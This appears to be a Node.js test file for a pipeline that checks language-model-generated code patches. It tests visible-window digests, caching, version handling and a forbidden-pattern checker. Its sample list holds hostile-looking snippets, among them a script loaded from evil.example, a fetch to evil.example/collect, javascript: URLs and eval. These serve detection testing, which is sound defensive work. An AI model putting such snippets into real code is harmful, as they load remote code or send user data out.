/* 自迭代管线回归（AUDIT-100-questions.md Q61–Q78 的可执行版本）。
 * 只 import 纯函数：cloudflare/iterate.js、cloudflare/rules.js 不碰网络/KV。
 * 浏览器那份 assets/lib/patch.js 用 vm 加载，和服务端 rules.js 做同输入对照（Q78）。
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  balance as sBalance, forbidden as sForbidden, warnings as sWarnings,
  validatePlan as sValidatePlan
} from '../cloudflare/rules.js';
import {
  digest, outline, screenPatches, planCacheKey, cacheFresh, pickBaseVersion,
  resolveTagTarget, writeArrayFile, patchReadmeChecked, PLAN_CACHE_TTL_SECONDS
} from '../cloudflare/iterate.js';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const read = (rel) => fs.readFileSync(path.join(root, rel), 'utf8');

function loadClientPatch() {
  const sandbox = { console };
  sandbox.XN = {};
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(read('assets/lib/patch.js'), sandbox, { filename: 'assets/lib/patch.js' });
  return sandbox.XN_PATCH;
}
const C = loadClientPatch();

const FILES = { 'a.js': 'function hello(){ return 1; }\nconst x = 1;\nconst y = 2;\n' };
const EDITABLE = ['a.js'];

/* ---------- Q62 / Q63：digest 只给看得见的段落，看不见的段落不许改 ---------- */

test('Q62/Q63 digest：大文件只给头尾，省略区带行号，并给出可见窗口', () => {
  const lines = [];
  for (let i = 0; i < 3000; i++) lines.push('const v' + i + ' = ' + i + ';');
  const src = lines.join('\n');
  const { text, windows } = digest({ 'a.js': src });

  assert.ok(text.includes('中间省略'), '省略处必须标出来');
  assert.match(text, /第 \d+–\d+ 行/, '省略区要带行号范围，模型才知道躲哪里');
  assert.ok(text.length < src.length, '确实只给了一部分');

  assert.equal(windows['a.js'].length, 2);
  assert.equal(windows['a.js'][0][0], 0, '头窗口从 0 开始');
  assert.equal(windows['a.js'][1][1], src.length, '尾窗口到文件末尾');
  assert.ok(windows['a.js'][1][0] > windows['a.js'][0][1], '中间是空洞');

  const small = digest({ 'a.js': 'const x = 1;\n' });
  assert.deepEqual([...small.windows['a.js']], [[0, 'const x = 1;\n'.length]], '小文件整份可见');
});

test('Q62 screenPatches：省略区里的 find 被拒，头尾可见的放行', () => {
  const src = Array.from({ length: 2000 }, (_, i) => 'const v' + i + ' = ' + i + ';').join('\n');
  const { windows } = digest({ 'a.js': src });
  const headFind = src.slice(0, 120);
  const midFind = src.slice(15000, 15120);

  const kept = screenPatches({ 'a.js': src }, [{ file: 'a.js', find: headFind }], windows);
  assert.equal(kept.dropped.length, 0);
  assert.equal(kept.patches.length, 1);

  const dropped = screenPatches({ 'a.js': src }, [{ file: 'a.js', find: midFind }], windows);
  assert.equal(dropped.patches.length, 0, '看不见的中段不许改');
  assert.equal(dropped.dropped.length, 1);
  assert.match(dropped.dropped[0].reason, /省略区间/);
});

/* ---------- Q64：outline 要抓箭头函数 / 对象方法 ---------- */

test('Q64 outline：箭头函数、对象方法、对象属性、类、生成器都进结构列表', () => {
  const code = [
    'const pick = (a) => a;',
    'const tick = async x => x + 1;',
    'const legacy = function (x) { return x; };',
    'function plain() {}',
    'function* gen() {}',
    'class Kit {}',
    'const obj = {',
    '  render(a) { return a; },',
    '  apply: function (x) { return x; },',
    '  dispose: (x) => x,',
    '  async load() {}',
    '};',
    'if (a) { for (;;) { while (b) {} } }'
  ].join('\n');
  const list = outline(code);
  for (const name of ['pick', 'tick', 'legacy', 'plain', 'gen', 'Kit', 'render', 'apply', 'dispose', 'load']) {
    assert.ok(list.includes(':' + name), '结构列表里应该有 ' + name + '：' + list);
  }
  for (const bad of [':if', ':for', ':while']) {
    assert.ok(!list.includes(bad), '控制语句不该当函数：' + bad + ' in ' + list);
  }
});

/* ---------- Q67 / Q68：缓存 key 随输入变化，TTL 单一常量 ---------- */

test('Q67 试运行缓存 key：反馈/模型/强度/版本任一变化都会换 key', () => {
  const fb = [{ ts: 1, type: 'bug', body: '按钮点不动' }];
  const base = { branch: 'main', version: '1.5.3', model: 'deepseek-chat', effort: 'max', feedback: fb };
  const k = planCacheKey('o', 'r', base);

  assert.equal(planCacheKey('o', 'r', base), k, '同输入必须稳定，否则缓存永远不命中');
  assert.notEqual(planCacheKey('o', 'r', { ...base, feedback: [{ ts: 1, type: 'bug', body: '按钮还是点不动' }] }), k);
  assert.notEqual(planCacheKey('o', 'r', { ...base, feedback: [] }), k);
  assert.notEqual(planCacheKey('o', 'r', { ...base, model: 'glm-4.7-flash' }), k);
  assert.notEqual(planCacheKey('o', 'r', { ...base, effort: 'low' }), k);
  assert.notEqual(planCacheKey('o', 'r', { ...base, version: '1.5.4' }), k);
  assert.ok(!k.includes('按钮点不动'), 'key 里不能塞反馈原文');
});

test('Q68 TTL：读写共用 PLAN_CACHE_TTL_SECONDS=900，没有第二个魔数', () => {
  assert.equal(PLAN_CACHE_TTL_SECONDS, 900);
  const now = 1_700_000_000_000;
  assert.equal(cacheFresh(now - 10_000, now), true);
  assert.equal(cacheFresh(now - 899_000, now), true);
  assert.equal(cacheFresh(now - 900_000, now), false, '900 秒后必须过期');
  assert.equal(cacheFresh(0, now), false);
  assert.equal(cacheFresh(null, now), false);

  const src = read('cloudflare/iterate.js');
  assert.match(src, /cacheFresh\(cached\.at\)/, '读缓存要走同一个判定');
  assert.match(src, /expirationTtl: PLAN_CACHE_TTL_SECONDS/, '写缓存要用同一个常量');
  assert.ok(!/Date\.now\(\)\s*-\s*cached\.at\s*<\s*\d{5,}/.test(src), '旧的 600000ms 判定不应复活');
});

/* ---------- Q61：小文件重写不该被绝对下限误杀 ---------- */

test('Q61 重写下限：小文件允许短内容，大文件截断照样拦', () => {
  const small = { 'a.js': 'x'.repeat(800) };            // 合法的小工具
  const smallOk = sValidatePlan(small, { mode: 'rewrite', rewrites: [{ file: 'a.js', content: 'y'.repeat(760) }] }, EDITABLE);
  assert.deepEqual([...smallOk.touched], ['a.js']);

  const big = { 'a.js': 'x'.repeat(5000) };
  assert.throws(() => sValidatePlan(big, { mode: 'rewrite', rewrites: [{ file: 'a.js', content: 'y'.repeat(1400) }] }, EDITABLE), /太短/);

  const tiny = { 'a.js': 'x'.repeat(300) };
  const tinyOk = sValidatePlan(tiny, { mode: 'rewrite', rewrites: [{ file: 'a.js', content: 'y'.repeat(300) }] }, EDITABLE);
  assert.deepEqual([...tinyOk.touched], ['a.js']);
});

/* ---------- Q65 / Q66：失败明细挂在错误上 ---------- */

test('Q66 全部补丁被跳过时，错误对象带着 skipped 明细', () => {
  const plan = {
    mode: 'patch',
    patches: [
      { file: 'a.js', find: '根本不存在的片段一', replace: 'x' },
      { file: 'a.js', find: '根本不存在的片段二', replace: 'y' }
    ]
  };
  let err = null;
  try { sValidatePlan({ ...FILES }, plan, EDITABLE, { partial: true }); } catch (e) { err = e; }
  assert.ok(err, '应该抛错');
  assert.match(err.message, /没有任何可应用的改动/);
  assert.equal(err.skipped.length, 2);
  assert.match(err.skipped[0].reason, /找不到原文/);

  let cerr = null;
  try { C.validatePlan({ ...FILES }, plan, EDITABLE, { partial: true }); } catch (e) { cerr = e; }
  assert.ok(cerr && cerr.skipped && cerr.skipped.length === 2, '浏览器版也要带明细');
});

/* ---------- Q72：tag 冲突判定 ---------- */

test('Q72 tag 422 要核对指向：轻量 tag / 注释 tag / 指向别处', () => {
  const commit = 'c'.repeat(40);
  const other = 'd'.repeat(40);

  assert.equal(resolveTagTarget({ object: { type: 'commit', sha: commit } }, null), commit);
  assert.equal(resolveTagTarget({ object: { type: 'tag', sha: 't1' } }, { object: { type: 'commit', sha: commit } }), commit);
  assert.equal(resolveTagTarget({ object: { type: 'tag', sha: 't1' } }, null), '', '注释 tag 没 deref 就不能当命中');
  assert.equal(resolveTagTarget({ object: { type: 'commit', sha: other } }, null), other);
  assert.equal(resolveTagTarget({}, null), '');
  assert.notEqual(resolveTagTarget({ object: { type: 'commit', sha: other } }, null), commit, '指向别处必须是冲突而不是 exists');
});

/* ---------- Q73：版本取多源最大 ---------- */

test('Q73 当前版本取多源最大 semver，手改 changelog 首条不会让版本回退', () => {
  assert.equal(pickBaseVersion(['1.5.3', '1.4.9', '1.6.0', '', null, 'v2.0.0'], '1.0.0'), '1.6.0');
  assert.equal(pickBaseVersion(['1.5.3', '1.5.10'], '1.0.0'), '1.5.10', '按 semver 比，不是字典序');
  assert.equal(pickBaseVersion([], '1.5.0'), '1.5.0');
  assert.equal(pickBaseVersion([undefined, 'x'], '9.9.9'), '9.9.9');
});

/* ---------- Q74：版本文件只增删条目，不整份重写 ---------- */

test('Q74 writeArrayFile：头部注释和没变的条目原样保留', () => {
  const original = [
    '/* 版本记录（最近 12 条）。 */',
    'window.XN_CHANGELOG = [',
    '  {',
    '    "version": "1.5.2",',
    '    "date": "2026-11-10",',
    '    "title": "旧条目",',
    '    "fixes": ["a"],',
    '    "features": []',
    '  }',
    '];',
    ''
  ].join('\n');
  const oldEntry = {
    version: '1.5.2', date: '2026-11-10', title: '旧条目', fixes: ['a'], features: []
  };
  const newEntry = { version: '1.5.3', date: '2026-11-11', title: '新条目', fixes: ['b'], features: [] };
  const out = writeArrayFile('XN_CHANGELOG', [newEntry, oldEntry], '版本记录（最近 12 条）。', original);

  assert.ok(out.startsWith('/* 版本记录（最近 12 条）。 */\nwindow.XN_CHANGELOG = ['), '头部注释和赋值语句要保留');
  assert.ok(out.includes('"title": "旧条目"'), '旧条目内容要在');
  assert.ok(out.includes('\n  {\n    "version": "1.5.2"'), '旧条目的缩进/格式要原样保留，不能被 JSON.stringify 重排');
  assert.ok(out.includes('"version": "1.5.3"'), '新条目要加进去');
  assert.ok(out.trimEnd().endsWith('];'), '结尾分号要保留');
  assert.equal(out.split('"version": "1.5.2"').length - 1, 1, '不能重复写同一条');

  /* 没有数组结构时退回原来的写法，但至少带上注释 */
  assert.equal(writeArrayFile('X', [], 'note', ''), '/* note */\nwindow.X = [];\n');
});

/* ---------- Q75：README 标记丢了要报错，不能静默 ---------- */

test('Q75 patchReadmeChecked：标记缺失要 ok:false，宽松标记也要认', () => {
  const entry = { version: '1.6.0', title: '修一个bug' };
  const missing = patchReadmeChecked('# 说明\n没有标记\n', entry);
  assert.equal(missing.ok, false);
  assert.match(missing.reason, /XN:VERSION/);

  const loose = [
    '<!--  XN:VERSION  -->',
    '当前版本 **v1.5.3**',
    '<!--  /  XN:VERSION  -->',
    '',
    '<!-- XN:RECENT -->',
    '- **v1.5.3** 旧',
    '<!-- /XN:RECENT -->'
  ].join('\n');
  const ok = patchReadmeChecked(loose, entry);
  assert.equal(ok.ok, true);
  assert.match(ok.text, /v1\.6\.0/);
  assert.match(ok.text, /- \*\*v1\.6\.0\*\* 修一个bug/);
  assert.ok(ok.text.includes('- **v1.5.3** 旧'), '旧条目要保留');

  const noRecent = '<!-- XN:VERSION -->x<!-- /XN:VERSION -->';
  const r2 = patchReadmeChecked(noRecent, entry);
  assert.equal(r2.ok, true);
  assert.match(r2.reason, /RECENT/);
});

/* ---------- Q77 / Q78：禁止写法 + 双份实现一致性 ---------- */

const PARITY_SAMPLES = [
  'const a = eval("1");',
  'const f = new Function("return 1");',
  'document.write("<b>x</b>");',
  '<script src="https://evil.example/x.js"></script>',
  "// 规则里写着：禁止 javascript: 伪协议",
  "a.href = 'javascript:alert(1)'",
  "window.location = 'javascript:alert(1)'",
  "el.setAttribute('href', 'javascript:alert(1)')",
  'const m = await import(url);',
  "const m = await import('./mod.js');",
  "const r = await fetch('https://evil.example/collect');",
  "const r = await fetch(base + '/chat/completions');",
  'el.innerHTML = data;',
  'el.innerHTML = `<b>${esc(x)}</b>`;',
  'box.insertAdjacentHTML("beforeend", html);',
  'document.cookie = "a=1";',
  'localStorage.setItem("token", t);',
  'function f(){ return /\\{/.test(x); }',
  'function f(){ return /}/.test(x); }',
  'function f(){ var a = b / c; }',
  'var re = /[a-z0-9_\']+/g; function a(){}',
  'const s = `x ${ {a:1}.a } y`;',
  '// }\nconst a = 1;',
  '/* } */ function a(){}',
  'function a(){',
  'function a(){ return 1; }}'
];

test('Q77 forbidden：拦动态 import 非字面量 / 字面量外链 fetch，注释里的 javascript: 放行', () => {
  assert.equal(sForbidden('const m = await import(url);'), '动态 import 非字面量');
  assert.equal(sForbidden("const m = await import('./mod.js');"), '', '字面量 import 是合法的');
  assert.equal(sForbidden("fetch('https://evil.example/collect')"), '字面量外链 fetch');
  assert.equal(sForbidden("fetch(base + '/chat/completions')"), '', '变量地址不能被误伤');
  assert.equal(sForbidden('// 禁止 javascript: 伪协议'), '', '注释里讨论不算违规');
  assert.equal(sForbidden("a.href = 'javascript:alert(1)'"), 'javascript: 伪协议');

  /* innerHTML 不硬拦（项目里 50+ 处在用），但必须出现在 warnings 里 */
  assert.equal(sForbidden('el.innerHTML = data;'), '');
  assert.ok(sWarnings('el.innerHTML = data;').some((w) => w.includes('innerHTML')));
  assert.deepEqual([...sWarnings('el.textContent = data;')], [], 'textContent 不该报警');
});

test('Q78 双份实现一致性：forbidden / warnings / balance 同输入同输出', () => {
  for (const s of PARITY_SAMPLES) {
    assert.equal(C.forbidden(s), sForbidden(s), 'forbidden 不一致：' + JSON.stringify(s));
    assert.deepEqual([...C.warnings(s)], [...sWarnings(s)], 'warnings 不一致：' + JSON.stringify(s));
    assert.equal(C.balance(s).ok, sBalance(s).ok, 'balance 结论不一致：' + JSON.stringify(s));
  }
});

test('Q78 balance：return /re/ 里的括号和引号不是代码括号', () => {
  assert.equal(sBalance('function f(){ return /\\{/.test(x); }').ok, true);
  assert.equal(sBalance('function f(){ return /}/.test(x); }').ok, true);
  assert.equal(sBalance("function f(){ return /['\"]/.test(s); }").ok, true);
  assert.equal(sBalance('function f(){ return /re/.test(x); }').ok, true, '最普通的 return /re/ 也不能误判');
  assert.equal(sBalance('function f(){ var a = b / c; var d = (e) / f; }').ok, true, '除号还是除号');
  assert.equal(sBalance('function f(){ return /\\{/.test(x); ').ok, false, '真的少括号仍要拦');

  for (const s of [
    'function f(){ return /\\{/.test(x); }',
    'function f(){ return /}/.test(x); }',
    "function f(){ return /['\"]/.test(s); }"
  ]) {
    assert.equal(C.balance(s).ok, true, '浏览器版也要认：' + s);
  }
});

test('Q78 双份 validatePlan 一致性：partial 的 touched/skipped 要一模一样', () => {
  const files = { 'a.js': 'const keep = 1;\nconst bad = 2;\n' };
  const plan = {
    mode: 'patch',
    patches: [
      { file: 'a.js', find: 'const keep = 1;', replace: 'const keep = 10;' },
      { file: 'a.js', find: '压根不存在的原文', replace: 'x' }
    ]
  };
  const a = sValidatePlan({ ...files }, plan, EDITABLE, { partial: true });
  const b = C.validatePlan({ ...files }, plan, EDITABLE, { partial: true });
  assert.deepEqual([...a.touched], [...b.touched]);
  assert.equal(JSON.stringify(a.skipped), JSON.stringify(b.skipped), 'skipped 明细两边必须一致');

  /* rewrite 太短的判定两边也要一致 */
  const rw = { mode: 'rewrite', rewrites: [{ file: 'a.js', content: 'short' }] };
  assert.throws(() => sValidatePlan({ 'a.js': 'x'.repeat(3000) }, rw, EDITABLE), /太短/);
  assert.throws(() => C.validatePlan({ 'a.js': 'x'.repeat(3000) }, rw, EDITABLE), /太短/);
});

test('Q63 多文件 digest 总可见字符不超预算（预算耗尽的文件只给结构）', () => {
  const files = {};
  for (let i = 0; i < 24; i++) files['f' + i + '.js'] = ('const x' + i + ' = ' + i + ';\n').repeat(300);
  const { windows, text } = digest(files);
  const visible = Object.values(windows).reduce((n, ws) => n + ws.reduce((m, s) => m + (s[1] - s[0]), 0), 0);
  assert.ok(visible <= 60000, '可见字符数不能超总预算，实际 ' + visible);
  assert.ok(text.length < 100000, '提示词整体也要有上界，实际 ' + text.length);
  const exhausted = Object.keys(files).filter((k) => windows[k].length === 0);
  for (const k of exhausted) assert.match(text, new RegExp('### ' + k.replace('.', '\\.') + '[\\s\\S]*预算已用完'));
});